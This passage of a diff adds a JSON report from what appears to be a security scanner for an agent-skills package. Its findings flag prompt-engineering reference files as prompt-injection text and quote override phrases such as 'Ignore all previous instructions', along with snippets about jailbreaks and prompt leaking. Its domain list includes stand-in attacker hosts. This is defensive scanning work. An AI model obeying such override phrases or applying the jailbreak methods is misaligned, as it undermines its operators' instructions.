+      "file_sha256": "9a1c8762c49296a7338b6a04de44ba0a07bb6187ed59b63efe9e34eb01a45665"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "skillforge-d795029c4ed70e1c3268cf5caff364c445e0f7b3/packages/server/starter-packs/codealive/skills/prompt-engineering/references/mistakes-security.md",
+      "line": 13,
+      "evidence": "Ignore all previous instructions",
+      "file_sha256": "2240c94e6c01b826bd07c38c5b5666372ff78ba4047bd8a3b7f58d83eb99bebd"
+    },
+    {
+      "severity": "high",
+      "id": "AGT-C-0001",
+      "summary": "Text reads like a prompt-injection attempt (classifier)",
+      "path": "skillforge-d795029c4ed70e1c3268cf5caff364c445e0f7b3/packages/server/starter-packs/codealive/skills/prompt-engineering/references/mistakes-security.md",
+      "line": 13,
+      "evidence": "p=1.00 **Classic scenario:** Inject into a customer support chatbot: \"Ignore all previo",
+      "file_sha256": "2240c94e6c01b826bd07c38c5b5666372ff78ba4047bd8a3b7f58d83eb99bebd"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-C-0001",
+      "summary": "Text reads like a prompt-injection attempt (classifier)",
+      "path": "skillforge-d795029c4ed70e1c3268cf5caff364c445e0f7b3/packages/server/starter-packs/codealive/skills/prompt-engineering/references/mistakes-security.md",
+      "line": 15,
+      "evidence": "p=0.92 **Mechanism:** The model treats injected instructions as equivalent to system in",
+      "file_sha256": "2240c94e6c01b826bd07c38c5b5666372ff78ba4047bd8a3b7f58d83eb99bebd"
+    },
+    {
+      "severity": "high",
+      "id": "AGT-C-0001",
+      "summary": "Text reads like a prompt-injection attempt (classifier)",
+      "path": "skillforge-d795029c4ed70e1c3268cf5caff364c445e0f7b3/packages/server/starter-packs/codealive/skills/prompt-engineering/references/mistakes-security.md",
+      "line": 71,
+      "evidence": "p=0.99 - No credentials, API keys, or internal architecture details in system prompts -",
+      "file_sha256": "2240c94e6c01b826bd07c38c5b5666372ff78ba4047bd8a3b7f58d83eb99bebd"
+    },
+    {
+      "severity": "high",
+      "id": "AGT-C-0001",
+      "summary": "Text reads like a prompt-injection attempt (classifier)",
+      "path": "skillforge-d795029c4ed70e1c3268cf5caff364c445e0f7b3/packages/server/starter-packs/codealive/skills/prompt-engineering/references/gpt5-family-prompting.md",
+      "line": 584,
+      "evidence": "p=1.00 ### Instruction Priority",
+      "file_sha256": "8e7dfafafd4ab1b7818f1f0d572cc12c7772fe1bd1d742898ef9a07b3ef8d3f1"
+    },
+    {
+      "severity": "high",
+      "id": "AGT-C-0001",
+      "summary": "Text reads like a prompt-injection attempt (classifier)",
+      "path": "skillforge-d795029c4ed70e1c3268cf5caff364c445e0f7b3/packages/server/starter-packs/codealive/skills/prompt-engineering/references/gpt5-family-prompting.md",
+      "line": 595,
+      "evidence": "p=0.99 Higher-priority developer or system instructions remain binding.",
+      "file_sha256": "8e7dfafafd4ab1b7818f1f0d572cc12c7772fe1bd1d742898ef9a07b3ef8d3f1"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-C-0001",
+      "summary": "Text reads like a prompt-injection attempt (classifier)",
+      "path": "skillforge-d795029c4ed70e1c3268cf5caff364c445e0f7b3/packages/server/starter-packs/codealive/skills/prompt-engineering/references/gpt5-family-prompting.md",
+      "line": 886,
+      "evidence": "p=0.94 - Emphasize persistence and completeness (5.1 can be excessively concise) - Be e",
+      "file_sha256": "8e7dfafafd4ab1b7818f1f0d572cc12c7772fe1bd1d742898ef9a07b3ef8d3f1"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-C-0001",
+      "summary": "Text reads like a prompt-injection attempt (classifier)",
+      "path": "skillforge-d795029c4ed70e1c3268cf5caff364c445e0f7b3/packages/server/starter-packs/codealive/skills/prompt-engineering/references/gemini3-family-prompting.md",
+      "line": 162,
+      "evidence": "p=0.92 Open-ended instructions like \"do not infer\" may cause failures at basic logic.",
+      "file_sha256": "c5c0b41492233481fa355b7c37b5371e37a36eec33e185476a202f6c2bba7643"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-C-0001",
+      "summary": "Text reads like a prompt-injection attempt (classifier)",
+      "path": "skillforge-d795029c4ed70e1c3268cf5caff364c445e0f7b3/packages/server/starter-packs/codealive/skills/prompt-engineering/references/gemini3-family-prompting.md",
+      "line": 230,
+      "evidence": "p=0.92 System instructions don't fully prevent jailbreaks or leaks. They guide but don'",
+      "file_sha256": "c5c0b41492233481fa355b7c37b5371e37a36eec33e185476a202f6c2bba7643"
+    },
+    {
+      "severity": "high",
+      "id": "AGT-C-0001",
+      "summary": "Text reads like a prompt-injection attempt (classifier)",
+      "path": "skillforge-d795029c4ed70e1c3268cf5caff364c445e0f7b3/packages/server/starter-packs/codealive/skills/prompt-engineering/references/claude-fable5-prompting.md",
+      "line": 24,
+      "evidence": "p=0.99 ## Prefer Brief, High-Level Instructions",
+      "file_sha256": "dfd70deec8a5672a5c420e555c4ac2ea9b84b1d621d662a36284bb85ae6ab839"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-C-0001",
+      "summary": "Text reads like a prompt-injection attempt (classifier)",
+      "path": "skillforge-d795029c4ed70e1c3268cf5caff364c445e0f7b3/packages/server/starter-packs/codealive/skills/prompt-engineering/references/claude-family-prompting.md",
+      "line": 283,
+      "evidence": "p=0.95 ### Literal Instruction Following on Opus 4.7",
+      "file_sha256": "62be8751e2358a4d842a63d327881da829648a1dc8144c2d557c46053bdb4079"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-C-0001",
+      "summary": "Text reads like a prompt-injection attempt (classifier)",
+      "path": "skillforge-d795029c4ed70e1c3268cf5caff364c445e0f7b3/packages/server/starter-packs/codealive/skills/prompt-engineering/references/claude-family-prompting.md",
+      "line": 328,
+      "evidence": "p=0.91 ### Explicit Action Instructions",
+      "file_sha256": "62be8751e2358a4d842a63d327881da829648a1dc8144c2d557c46053bdb4079"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "skillforge-d795029c4ed70e1c3268cf5caff364c445e0f7b3/packages/server/starter-packs/codealive/skills/prompt-engineering/references/prompting-risks.md",
+      "line": 27,
+      "evidence": "Ignore the above directions",
+      "file_sha256": "623702e616f229dc6554847d5c588e55b92954cbfd9c886ba2824f08f38bf4d7"
+    },
+    {
+      "severity": "high",
+      "id": "AGT-C-0001",
+      "summary": "Text reads like a prompt-injection attempt (classifier)",
+      "path": "skillforge-d795029c4ed70e1c3268cf5caff364c445e0f7b3/packages/server/starter-packs/codealive/skills/prompt-engineering/references/prompting-risks.md",
+      "line": 35,
+      "evidence": "p=1.00 We can observe that the original instruction was somewhat ignored by the follow-",
+      "file_sha256": "623702e616f229dc6554847d5c588e55b92954cbfd9c886ba2824f08f38bf4d7"
+    },
+    {
+      "severity": "high",
+      "id": "AGT-C-0001",
+      "summary": "Text reads like a prompt-injection attempt (classifier)",
+      "path": "skillforge-d795029c4ed70e1c3268cf5caff364c445e0f7b3/packages/server/starter-packs/codealive/skills/prompt-engineering/references/prompting-risks.md",
+      "line": 37,
+      "evidence": "p=0.99 Keep in mind that when we are designing prompts we are just chaining instruction",
+      "file_sha256": "623702e616f229dc6554847d5c588e55b92954cbfd9c886ba2824f08f38bf4d7"
+    },
+    {
+      "severity": "high",
+      "id": "AGT-C-0001",
+      "summary": "Text reads like a prompt-injection attempt (classifier)",
+      "path": "skillforge-d795029c4ed70e1c3268cf5caff364c445e0f7b3/packages/server/starter-packs/codealive/skills/prompt-engineering/references/prompting-risks.md",
+      "line": 39,
+      "evidence": "p=0.98 As you develop your prompts for your applications, you might be thinking about h",
+      "file_sha256": "623702e616f229dc6554847d5c588e55b92954cbfd9c886ba2824f08f38bf4d7"
+    },
+    {
+      "severity": "high",
+      "id": "AGT-C-0001",
+      "summary": "Text reads like a prompt-injection attempt (classifier)",
+      "path": "skillforge-d795029c4ed70e1c3268cf5caff364c445e0f7b3/packages/server/starter-packs/codealive/skills/prompt-engineering/references/prompting-risks.md",
+      "line": 73,
+      "evidence": "p=1.00 The idea of this attack is that it hijacks the model output by injecting an inst",
+      "file_sha256": "623702e616f229dc6554847d5c588e55b92954cbfd9c886ba2824f08f38bf4d7"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-C-0001",
+      "summary": "Text reads like a prompt-injection attempt (classifier)",
+      "path": "skillforge-d795029c4ed70e1c3268cf5caff364c445e0f7b3/packages/server/starter-packs/codealive/skills/prompt-engineering/references/prompting-risks.md",
+      "line": 113,
+      "evidence": "p=0.94 The above output returns the exemplars which could be confidential information t",
+      "file_sha256": "623702e616f229dc6554847d5c588e55b92954cbfd9c886ba2824f08f38bf4d7"
+    },
+    {
+      "severity": "high",
+      "id": "AGT-C-0001",
+      "summary": "Text reads like a prompt-injection attempt (classifier)",
+      "path": "skillforge-d795029c4ed70e1c3268cf5caff364c445e0f7b3/packages/server/starter-packs/codealive/skills/prompt-engineering/references/prompting-risks.md",
+      "line": 119,
+      "evidence": "p=1.00 Some modern LLMs will avoid responding to unethical instructions provide in a pr",
+      "file_sha256": "623702e616f229dc6554847d5c588e55b92954cbfd9c886ba2824f08f38bf4d7"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-C-0001",
+      "summary": "Text reads like a prompt-injection attempt (classifier)",
+      "path": "skillforge-d795029c4ed70e1c3268cf5caff364c445e0f7b3/packages/server/starter-packs/codealive/skills/prompt-engineering/references/prompting-risks.md",
+      "line": 123,
+      "evidence": "p=0.95 Below is an example of a jailbreak where a prompter was able to bypass the conte",
+      "file_sha256": "623702e616f229dc6554847d5c588e55b92954cbfd9c886ba2824f08f38bf4d7"
+    },
+    {
+      "severity": "high",
+      "id": "AGT-C-0001",
+      "summary": "Text reads like a prompt-injection attempt (classifier)",
+      "path": "skillforge-d795029c4ed70e1c3268cf5caff364c445e0f7b3/packages/server/starter-packs/codealive/skills/prompt-engineering/references/prompting-risks.md",
+      "line": 132,
+      "evidence": "p=0.99 There are many other variations of this prompt, also known as *jailbreaking*, wi",
+      "file_sha256": "623702e616f229dc6554847d5c588e55b92954cbfd9c886ba2824f08f38bf4d7"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-C-0001",
+      "summary": "Text reads like a prompt-injection attempt (classifier)",
+      "path": "skillforge-d795029c4ed70e1c3268cf5caff364c445e0f7b3/packages/server/starter-packs/codealive/skills/prompt-engineering/references/prompting-risks.md",
+      "line": 134,
+      "evidence": "p=0.92 Models like ChatGPT and Claude have been aligned to avoid outputting content tha",
+      "file_sha256": "623702e616f229dc6554847d5c588e55b92954cbfd9c886ba2824f08f38bf4d7"
+    },
+    {
+      "severity": "high",
+      "id": "AGT-C-0001",
+      "summary": "Text reads like a prompt-injection attempt (classifier)",
+      "path": "skillforge-d795029c4ed70e1c3268cf5caff364c445e0f7b3/packages/server/starter-packs/codealive/skills/prompt-engineering/references/prompting-risks.md",
+      "line": 138,
+      "evidence": "p=0.98 LLMs like ChatGPT includes guardrails limiting the model from outputting harmful",
+      "file_sha256": "623702e616f229dc6554847d5c588e55b92954cbfd9c886ba2824f08f38bf4d7"
+    },
+    {
+      "severity": "high",
+      "id": "AGT-C-0001",
+      "summary": "Text reads like a prompt-injection attempt (classifier)",
+      "path": "skillforge-d795029c4ed70e1c3268cf5caff364c445e0f7b3/packages/server/starter-packs/codealive/skills/prompt-engineering/references/prompting-risks.md",
+      "line": 193,
+      "evidence": "p=1.00 Here is an example that instructs the model to simulate a game with instructions",
+      "file_sha256": "623702e616f229dc6554847d5c588e55b92954cbfd9c886ba2824f08f38bf4d7"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-C-0001",
+      "summary": "Text reads like a prompt-injection attempt (classifier)",
+      "path": "skillforge-d795029c4ed70e1c3268cf5caff364c445e0f7b3/packages/server/starter-packs/codealive/skills/prompt-engineering/references/prompting-risks.md",
+      "line": 197,
+      "evidence": "p=0.92 It's widely known that language models tend to elicit undesirable and harmful be",
+      "file_sha256": "623702e616f229dc6554847d5c588e55b92954cbfd9c886ba2824f08f38bf4d7"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-C-0001",
+      "summary": "Text reads like a prompt-injection attempt (classifier)",
+      "path": "skillforge-d795029c4ed70e1c3268cf5caff364c445e0f7b3/packages/server/starter-packs/codealive/skills/prompt-engineering/references/prompting-risks.md",
+      "line": 201,
+      "evidence": "p=0.92 #### Add Defense in the Instruction",
+      "file_sha256": "623702e616f229dc6554847d5c588e55b92954cbfd9c886ba2824f08f38bf4d7"
+    },
+    {
+      "severity": "high",
+      "id": "AGT-C-0001",
+      "summary": "Text reads like a prompt-injection attempt (classifier)",
+      "path": "skillforge-d795029c4ed70e1c3268cf5caff364c445e0f7b3/packages/server/starter-packs/codealive/skills/prompt-engineering/references/prompting-risks.md",
+      "line": 203,
+      "evidence": "p=0.99 A simple defense tactic to start experimenting with is to just enforce the desir",
+      "file_sha256": "623702e616f229dc6554847d5c588e55b92954cbfd9c886ba2824f08f38bf4d7"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-C-0001",
+      "summary": "Text reads like a prompt-injection attempt (classifier)",
+      "path": "skillforge-d795029c4ed70e1c3268cf5caff364c445e0f7b3/packages/server/starter-packs/codealive/skills/prompt-engineering/references/prompting-risks.md",
+      "line": 231,
+      "evidence": "p=0.95 We can see that even when we injected the malicious instruction at the end, the ",
+      "file_sha256": "623702e616f229dc6554847d5c588e55b92954cbfd9c886ba2824f08f38bf4d7"
+    },
+    {
+      "severity": "high",
+      "id": "AGT-C-0001",
+      "summary": "Text reads like a prompt-injection attempt (classifier)",
+      "path": "skillforge-d795029c4ed70e1c3268cf5caff364c445e0f7b3/packages/server/starter-packs/codealive/skills/prompt-engineering/references/prompting-risks.md",
+      "line": 239,
+      "evidence": "p=0.97 Riley also followed up with a [workaround](https://twitter.com/goodside/status/1",
+      "file_sha256": "623702e616f229dc6554847d5c588e55b92954cbfd9c886ba2824f08f38bf4d7"
+    },
+    {
+      "severity": "high",
+      "id": "AGT-C-0001",
+      "summary": "Text reads like a prompt-injection attempt (classifier)",
+      "path": "skillforge-d795029c4ed70e1c3268cf5caff364c445e0f7b3/packages/server/starter-packs/codealive/skills/prompt-engineering/references/prompting-risks.md",
+      "line": 306,
+      "evidence": "p=0.99 The k-shot prompt solution, which discards the instructions, works well for gene",
+      "file_sha256": "623702e616f229dc6554847d5c588e55b92954cbfd9c886ba2824f08f38bf4d7"
+    },
+    {
+      "severity": "high",
+      "id": "AGT-C-0001",
+      "summary": "Text reads like a prompt-injection attempt (classifier)",
+      "path": "skillforge-d795029c4ed70e1c3268cf5caff364c445e0f7b3/packages/server/starter-packs/codealive/skills/prompt-engineering/references/prompting-risks.md",
+      "line": 310,
+      "evidence": "p=0.98 More recently, ChatGPT came into the scene. For many of the attacks that we trie",
+      "file_sha256": "623702e616f229dc6554847d5c588e55b92954cbfd9c886ba2824f08f38bf4d7"
+    },
+    {
+      "severity": "high",
+      "id": "AGT-C-0001",
+      "summary": "Text reads like a prompt-injection attempt (classifier)",
+      "path": "skillforge-d795029c4ed70e1c3268cf5caff364c445e0f7b3/packages/server/starter-packs/codealive/skills/prompt-engineering/references/prompting-risks.md",
+      "line": 455,
+      "evidence": "p=0.98 While that last sentence is somewhat subjective, flipping the distribution and i",
+      "file_sha256": "623702e616f229dc6554847d5c588e55b92954cbfd9c886ba2824f08f38bf4d7"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-C-0001",
+      "summary": "Text reads like a prompt-injection attempt (classifier)",
+      "path": "skillforge-d795029c4ed70e1c3268cf5caff364c445e0f7b3/packages/server/starter-packs/codealive/skills/hooks-management/SKILL.md",
+      "line": 356,
+      "evidence": "p=0.91 When adapting a Claude Code `ask` hook to Codex, prefer this order: 1. Use hard ",
+      "file_sha256": "34a1b2aac84e3c58b91555c24f58535d733766498a62e8bd8434ba11dd4c2afc"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-C-0001",
+      "summary": "Text reads like a prompt-injection attempt (classifier)",
+      "path": "skillforge-d795029c4ed70e1c3268cf5caff364c445e0f7b3/packages/server/starter-packs/codealive/skills/code-that-fits-in-your-head/references/security/knowledge.md",
+      "line": 7,
+      "evidence": "p=0.91 Software security is like insurance: you don't want to pay for it, but if you do",
+      "file_sha256": "44627a17e330186e787ff3f80ab736b5ca8b250cbd39f2242ba8c8ce14561902"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-C-0001",
+      "summary": "Text reads like a prompt-injection attempt (classifier)",
+      "path": "skillforge-d795029c4ed70e1c3268cf5caff364c445e0f7b3/packages/server/starter-packs/codealive/skills/code-that-fits-in-your-head/references/troubleshooting/rules.md",
+      "line": 71,
+      "evidence": "p=0.94 ### 9. Stop Repeating Experiments Without New Evidence",
+      "file_sha256": "e4e206309dcf82e061b691560717e8f3d25cb0e1f8b9c3a85bc050de1ee2e186"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-C-0001",
+      "summary": "Text reads like a prompt-injection attempt (classifier)",
+      "path": "skillforge-d795029c4ed70e1c3268cf5caff364c445e0f7b3/packages/server/starter-packs/codealive/skills/ux-best-practices/references/accessibility.md",
+      "line": 56,
+      "evidence": "p=0.93 On open, move focus inside, keep Tab/Shift+Tab within the dialog, support Escape",
+      "file_sha256": "77cb55ab67bac8ad195112ae977faf648860524baea478c382e96e7f359cbd88"
+    }
+  ],
+  "flags": [
+    {
+      "severity": "low",
+      "id": "AGT-F-NEW-DOMAINS",
+      "summary": "Contacts domains the previous version did not",
+      "path": null,
+      "line": null,
+      "evidence": "antigravity.google, api.deepseek.com, blog.google, cloud.google.com, code.claude.com, deepmind.google, dev.opencode.ai, developers.googleblog.com, docs.aws.amazon.com, generativelanguage.googleapis.com, learn.chatgpt.com",
+      "file_sha256": null
+    }
+  ],
+  "domains": [
+    "127.0.0.1",
+    "127.0.0.2",
+    "127.evil.example",
+    "accounts.google.com",
+    "acme.example",
+    "agentclientprotocol.com",
+    "ai.facebook.com",
+    "ai.google.com",
+    "ai.google.dev",
+    "ai.meta.com",
+    "alfworld.github.io",
+    "antigravity.google",
+    "api.deepseek.com",
+    "api.github.com",
+    "api.github.example",
+    "api.openai.com",
+    "arxiv.org",
+    "audit.example.com",
+    "biomejs.dev",
+    "blog.google",
+    "ci.example",
+    "cloud.google.com",
+    "code.claude.com",
+    "collect.example.dev",
+    "cookbook.openai.com",
+    "csrc.nist.gov",
+    "deepmind.google",
+    "dev.opencode.ai",
+    "developers.googleblog.com",
+    "developers.openai.com",
+    "devin.ai",
+    "docs.anthropic.com",
+    "docs.aws.amazon.com",
+    "docs.claude.com",
+    "docs.cloud.google.com",
+    "docs.x.ai",
+    "en.wikipedia.org",
+    "eslint.org",
+    "evil.example",
+    "evil.example.com",
+    "evil.test",
+    "evjang.com",
+    "example.com",
+    "example.dev",
+    "example.invalid",
+    "feross.org",
+    "fever.ai",
+    "generativelanguage.googleapis.com",
+    "get.example.dev",
+    "github.com",
+    "github.com.evil.example",
+    "github.example",
+    "grok.x.ai",
+    "h.example",
+    "help.openai.com",
+    "hostile.invalid",
+    "hotpotqa.github.io",
+    "json.schemastore.org",
+    "learn.chatgpt.com",
+    "mcp.example.com",
+    "mcp.linear.app",
+    "mcp.sentry.dev",
+    "openai.com",
+    "opencode.ai",
+    "opencollective.com",
+    "opensource.org",
+    "paperswithcode.com",
+    "platform.claude.com",
+    "polyformproject.org",
+    "python.langchain.com",
+    "registry-a.example",
+    "registry-b.example",
+    "registry.npmjs.org",
+    "runs.example",
+    "semver.org",
+    "sf.example.com",
+    "simonwillison.net",
+    "skillforge.example",
+    "skillforge.example.com",
+    "skillforge.invalid",
+    "skillforge.test",
+    "skills.example.com",
+    "skills.sh",
+    "static.modelcontextprotocol.io",
+    "techcrunch.com",
+    "telemetry.example.com",
+    "tidelift.com",
+    "twitter.com",
+    "webshop-pnlp.github.io",
+    "www.alignmentforum.org",
+    "www.anthropic.com",
+    "www.jailbreakchat.com",
+    "www.lesswrong.com",
+    "www.nature.com",
+    "www.npmjs.com",
+    "www.patreon.com",
+    "www.philschmid.de",
+    "www.promptingguide.ai",
+    "www.reddit.com",
+    "x.example"
+  ],
+  "install_script": false,
+  "score": "high"
+}
